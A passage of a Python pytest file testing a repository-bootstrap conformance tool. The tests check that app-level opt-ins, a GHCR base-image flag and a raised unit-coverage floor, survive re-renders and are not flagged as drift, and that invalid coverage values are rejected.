        pytest.skip(f"monorepo source not checked out: {canonical}")
    assert render(template_name) == canonical.read_text(encoding="utf-8"), (
        f"packages/conformance/conformance/bootstrap/templates/{template_name} has "
        f"drifted from the canonical {dest_rel} — copy the canonical file's content "
        "back into the template so consumer repos vendor the current version."
    )


def test_derive_falls_back_to_app_for_bare_atlan(tmp_path: pathlib.Path) -> None:
    # "atlan-app" → strip prefix → "app" → strip suffix ("app" doesn't end with "-app") → "app"
    assert derive_app_name_from_dir(tmp_path / "atlan-app") == "app"


# ---------------------------------------------------------------------------
# App-owned overrides that C002 must allow (FND-361)
#
# Two per-app opt-*ups*: a raised unit-coverage floor in tests.yaml, and the
# GHCR base-image redirect in build-and-publish.yaml. Both were being reported
# as drift, which made a connector doing the stricter/newer thing look
# non-conformant — and in the use_ghcr_base case a bare re-run silently
# reverted the opt-in, because that shim is always-overwrite.
# ---------------------------------------------------------------------------


def _bp_workflow(root: pathlib.Path) -> pathlib.Path:
    return root / ".github" / "workflows" / "build-and-publish.yaml"


def test_use_ghcr_base_flag_renders_the_opt_in(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--use-ghcr-base", "true"])
    assert "      use_ghcr_base: true\n" in _bp_workflow(tmp_path).read_text()


def test_bare_rerun_preserves_the_ghcr_base_opt_in(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The regression that made the opt-in unusable.

    build-and-publish.yaml is always-overwrite, so before the value was read
    back off the file, every subsequent bootstrap run deleted the app's opt-in
    and sent its image build back to Harbor.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--use-ghcr-base", "true"])
    _cmd_bootstrap([])
    assert "use_ghcr_base: true" in _bp_workflow(tmp_path).read_text()


def test_bare_rerun_preserves_a_hand_written_ghcr_base_opt_in(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The shape the first adopter actually wrote: the line under a comment.

    The comment itself is replaced by the re-render (this file is managed), but
    the opt-in it documents must survive — that is the value, and losing it is
    a silent registry change nobody asked for.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    bp = _bp_workflow(tmp_path)
    bp.write_text(
        bp.read_text().replace(
            "    secrets: inherit",
            "      # Canary for the GHCR base-image redirect.\n"
            "      use_ghcr_base: true\n    secrets: inherit",
        )
    )
    _cmd_bootstrap([])
    assert "use_ghcr_base: true" in bp.read_text()


def test_explicit_false_removes_the_ghcr_base_opt_in(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Autodetection preserves; an explicit flag decides. Otherwise there is no
    way back to Harbor short of hand-editing a managed file."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--use-ghcr-base", "true"])
    _cmd_bootstrap(["--use-ghcr-base", "false"])
    assert "use_ghcr_base" not in _bp_workflow(tmp_path).read_text()


def test_ghcr_base_opt_in_leaves_no_c002_finding(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The property the ticket is about: opting up is not drift."""
    from conformance.suite.checks.bootstrap_drift import scan_path

    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--use-ghcr-base", "true"])
    assert scan_path(_bp_workflow(tmp_path), tmp_path) == []


def test_unit_coverage_flag_renders_the_floor(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--unit-coverage-fail-under", "90"])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    assert '      unit-coverage-fail-under: "90"\n' in wf.read_text()


def test_unit_coverage_flag_rejects_a_non_numeric_value(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    with pytest.raises(SystemExit) as exc:
        _cmd_bootstrap(["--unit-coverage-fail-under", "high"])
    assert exc.value.code == 2


def test_unit_coverage_flag_rejects_a_value_above_100(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Coverage is a percent — 101+ is nonsensical, not a stricter bar."""
    monkeypatch.chdir(tmp_path)
    with pytest.raises(SystemExit) as exc:
        _cmd_bootstrap(["--unit-coverage-fail-under", "101"])
    assert exc.value.code == 2


def test_unit_coverage_flag_accepts_100(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """100 is the highest meaningful percent — the upper bound is inclusive."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--unit-coverage-fail-under", "100"])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    assert '      unit-coverage-fail-under: "100"\n' in wf.read_text()


def test_unit_coverage_flag_rejects_a_value_below_the_sdk_floor(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Writing a sub-floor value would scaffold a file C002 immediately flags,
    whose only remediation deletes the line the caller just asked for."""
    monkeypatch.setattr(extract_mod, "SDK_UNIT_COVERAGE_FLOOR", 40)
    monkeypatch.chdir(tmp_path)
    with pytest.raises(SystemExit) as exc:
        _cmd_bootstrap(["--unit-coverage-fail-under", "20"])
    assert exc.value.code == 2
    assert "below the SDK's own floor" in capsys.readouterr().err


def test_resync_preserves_a_raised_coverage_floor(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The other half of the ticket: --resync must not silently un-raise the bar.

    The structural catch-up has to land while the app's stricter floor stays —
    before this, --resync fixed the drift by dropping the line, so running the
    remediation cost the app its coverage gate.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(
        _drifted_tests_yaml(app_name="app").replace(
            '      app-name: "app"\n',
            '      unit-coverage-fail-under: "90"\n      app-name: "app"\n',
        )
    )
    _cmd_bootstrap(["--resync"])
    assert wf.read_text() == render(
        "tests.yaml", app_name="app", unit_coverage_fail_under="90"
    )


def test_resync_drops_a_coverage_floor_below_the_sdk_floor(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The one value --resync deliberately does not carry forward.

    An app may raise its coverage floor above the SDK's, not use its own
    workflow to duck under it — so the re-render drops the line and the app
    inherits the SDK floor. The C002 message says this will happen.
    """
    monkeypatch.setattr(extract_mod, "SDK_UNIT_COVERAGE_FLOOR", 40)
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(
        _drifted_tests_yaml(app_name="app").replace(
            '      app-name: "app"\n',
            '      unit-coverage-fail-under: "20"\n      app-name: "app"\n',
        )
    )
    _cmd_bootstrap(["--resync"])
    assert "unit-coverage-fail-under" not in wf.read_text()


# ---------------------------------------------------------------------------
# Premise pin: the SDK's own floor
# ---------------------------------------------------------------------------


def test_sdk_unit_coverage_floor_matches_the_reusable_workflow_default() -> None:
    """``SDK_UNIT_COVERAGE_FLOOR`` must equal tests-reusable.yaml's own default.

    The constant is a copy — this package ships standalone into consumer repos,
    where application-sdk's workflows aren't on disk — so the copy is pinned
    against the real input default here, in the monorepo where both exist. If
    the SDK raises its floor and this constant isn't moved with it, apps could
    keep declaring a floor below the fleet-wide bar with no finding at all.
    Skipped when the monorepo tree isn't checked out (isolated sdist build),
    matching the vendored-template guard above.
    """
    workflow = _MONOREPO_ROOT / ".github" / "workflows" / "tests-reusable.yaml"
    if not workflow.exists():
        pytest.skip(f"monorepo source not checked out: {workflow}")
    text = workflow.read_text(encoding="utf-8")
    block = text.split("unit-coverage-fail-under:", 1)
    assert len(block) == 2, "tests-reusable.yaml no longer declares the input"
    m = re.search(r'default:\s*"?(\d+)"?', block[1])
    assert m is not None, "the input no longer declares a numeric default"
    assert int(m.group(1)) == extract_mod.SDK_UNIT_COVERAGE_FLOOR, (
        "tests-reusable.yaml's unit-coverage-fail-under default has moved to "
        f"{m.group(1)} — update SDK_UNIT_COVERAGE_FLOOR in "
        "conformance/bootstrap/extract.py to match, or C002 will keep "
        "preserving per-app floors below the SDK's own."
    )
